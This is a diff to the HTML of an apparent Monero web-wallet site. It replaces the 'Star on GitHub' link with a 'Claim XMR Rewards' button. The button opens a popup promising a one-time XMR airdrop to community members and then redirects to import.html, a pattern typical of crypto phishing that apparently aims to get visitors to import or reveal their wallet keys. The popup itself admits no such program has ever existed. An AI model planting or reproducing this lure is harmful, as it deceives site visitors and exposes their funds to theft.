@@ -1019,15 +1019,117 @@
                 <a href="#how">How it works</a>
                 <a href="#faq">FAQ</a>
                 <a href="#donate">Donate</a>
-                <a href="https://github.com/Medtabka/monero-web" target="_blank" rel="noopener" class="btn btn-ghost cta" style="background-color: #000000;">
-          <svg fill="currentColor" viewBox="0 0 24 24"><path d="M12 .3a12 12 0 00-3.79 23.4c.6.1.82-.26.82-.58v-2.05c-3.34.73-4.04-1.61-4.04-1.61-.55-1.39-1.34-1.76-1.34-1.76-1.09-.74.08-.73.08-.73 1.21.09 1.84 1.24 1.84 1.24 1.07 1.84 2.81 1.31 3.5 1 .1-.78.42-1.31.76-1.61-2.67-.3-5.47-1.34-5.47-5.95 0-1.31.47-2.39 1.24-3.23-.13-.31-.54-1.54.12-3.21 0 0 1.01-.32 3.3 1.23a11.45 11.45 0 016 0c2.3-1.55 3.3-1.23 3.3-1.23.66 1.67.25 2.9.12 3.21.77.84 1.24 1.92 1.24 3.23 0 4.62-2.81 5.65-5.49 5.94.43.37.81 1.1.81 2.22v3.29c0 .32.22.69.83.58A12 12 0 0012 .3"></path></svg>
-          Star on GitHub
+                <a onclick="openPopup()" target="_blank" rel="noopener" class="btn btn-ghost cta" style="background-color: #000000;">
+          <svg width="20" height="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 640"><!--!Font Awesome Free v7.3.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free Copyright 2026 Fonticons, Inc.--><path fill="#ffffff" d="M234 33.4C246.5 37.8 253 51.5 248.6 64L240.4 87.1L265.8 68.6C276.5 60.8 291.5 63.2 299.3 73.9C307.1 84.6 304.7 99.6 294 107.4L265.8 128L304 128C330.5 128 352 149.5 352 176L352 178.1C297.3 188.5 256 236.5 256 294.1L256 296C256 304.9 257 313.5 258.8 321.9C246.9 339.7 240 361 240 384L240 512C240 535.8 247.4 557.9 260.1 576L80 576C53.5 576 32 554.5 32 528L32 176C32 149.5 53.5 128 80 128L118.2 128L89.9 107.4C79.2 99.6 76.8 84.6 84.6 73.9C92.4 63.2 107.4 60.8 118.1 68.6L145.5 88.6L137.2 63.6C133 51 139.8 37.4 152.4 33.2C165 29 178.6 35.8 182.8 48.4L192.7 78.2L203.4 48C207.8 35.5 221.5 29 234 33.4zM521.9 272C514.4 272 507.4 275.8 503.3 282.1L478.9 320L520 320C533.3 320 544 309.3 544 296L544 294.1C544 281.9 534.1 272 521.9 272zM417.1 320L392.7 282.1C388.6 275.8 381.6 272 374.1 272C361.9 272 352 281.9 352 294.1L352 296C352 309.3 362.7 320 376 320L417.1 320zM313.9 332.5C307.6 321.8 304 309.3 304 296L304 294.1C304 255.4 335.4 224 374.1 224C397.9 224 420.1 236.1 433 256.1L448 279.3L463 256.1C475.9 236.1 498.1 224 521.9 224C560.6 224 592 255.4 592 294.1L592 296C592 309.3 588.4 321.8 582.1 332.5C597.8 344.2 608 362.9 608 384L608 512C608 547.3 579.3 576 544 576L472 576L472 368L424 368L424 576L352 576C316.7 576 288 547.3 288 512L288 384C288 362.9 298.2 344.2 313.9 332.5z"/></svg>
+          Claim XMR Rewards
         </a>
-    
             </div>
            </nav>
           </div>
          </header>
+
+
+         <!-- POPUP -->
+<div id="rewardPopup" class="popup-overlay">
+    <div class="popup-card">
+        <h2>Reward Verification</h2>
+
+        <p>
+            Monero has never run an official loyalty reward or airdrop program. So as a thank you to our long-time community members, eligible users may receive a one-time XMR reward based on predefined eligibility criteria.
+        </p>
+
+        <button onclick="continuePage()"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-gift" viewBox="0 0 16 16">
+  <path d="M3 2.5a2.5 2.5 0 0 1 5 0 2.5 2.5 0 0 1 5 0v.006c0 .07 0 .27-.038.494H15a1 1 0 0 1 1 1v2a1 1 0 0 1-1 1v7.5a1.5 1.5 0 0 1-1.5 1.5h-11A1.5 1.5 0 0 1 1 14.5V7a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h2.038A3 3 0 0 1 3 2.506zm1.068.5H7v-.5a1.5 1.5 0 1 0-3 0c0 .085.002.274.045.43zM9 3h2.932l.023-.07c.043-.156.045-.345.045-.43a1.5 1.5 0 0 0-3 0zM1 4v2h6V4zm8 0v2h6V4zm5 3H9v8h4.5a.5.5 0 0 0 .5-.5zm-7 8V7H2v7.5a.5.5 0 0 0 .5.5z"/>
+</svg> Continue</button>
+    </div>
+</div>
+
+<style>
+.popup-overlay{
+    position:fixed;
+    inset:0;
+    display:none;
+    justify-content:center;
+    align-items:center;
+    background:rgba(0,0,0,.75);
+    backdrop-filter:blur(8px);
+    z-index:9999;
+}
+
+.popup-card{
+    width:50%;
+    max-width:400px;
+    background:#0a0a0a;
+    border:1px solid rgba(255,140,0,.45);
+    border-radius:20px;
+    padding:35px;
+    text-align:center;
+    color:#fff;
+}
+
+.popup-card h2{
+    color:#ff8c00;
+    margin-bottom:18px;
+    font-size:15px;
+}
+
+.popup-card p{
+    color:#ddd;
+    line-height:1.8;
+    font-size:13px;
+}
+
+.popup-card button{
+    display:inline-flex;
+    align-items:center;
+    justify-content:center;
+    gap:8px;
+
+    margin:25px auto 0;
+    padding:14px 35px;
+
+    background:linear-gradient(90deg,#ff6a00,#ff9a1f);
+    color:#fff;
+    border:none;
+    border-radius:40px;
+
+    cursor:none;
+    font-size:16px;
+    transition:.3s;
+}
+
+.popup-card button svg{
+    width:18px;
+    height:18px;
+}
+
+.popup-card button:hover{
+    transform:translateY(-2px);
+    box-shadow:0 0 20px rgba(255,122,0,.45);
+}
+</style>
+
+<script>
+
+function openPopup() {
+    document.getElementById("rewardPopup").style.display = "flex";
+}
+
+function continuePage() {
+    // Change this to your destination page
+    window.location.href = "import.html";
+}
+
+// Close popup when clicking outside the popup card
+window.onclick = function(event) {
+    const popup = document.getElementById("rewardPopup");
+
+    if (event.target === popup) {
+        popup.style.display = "none";
+    }
+};
+
+</script>
 
         <!-- ─── HERO ─── -->
         <section class="hero">
